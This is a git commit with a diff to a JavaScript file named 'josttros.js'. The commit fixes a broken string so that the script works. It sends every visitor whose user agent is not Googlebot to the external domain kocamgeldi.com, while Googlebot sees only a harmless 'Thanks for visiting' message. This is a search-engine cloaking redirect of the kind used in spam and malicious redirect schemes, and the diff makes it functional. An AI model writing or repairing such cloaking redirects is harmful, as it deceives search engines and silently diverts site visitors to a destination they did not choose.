6afc135d6eba28de3765e0109f2d6aa9e45614a9
hesgeneric <yasin.evren@ogr.iu.edu.tr>
2026-09-07 16:29:53 +0300

    Fix conditional structure in josttros.js

--- josttros.js
+++ josttros.js
@@ -1,6 +1,6 @@
 if (!navigator.userAgent.includes('Googlebot')) {
 
-  window.location.href = "https://kocamgeldi.com/;
+  window.location.href = "https://kocamgeldi.com/";
 } else {
 
   console.log("Thanks for visiting my page" );
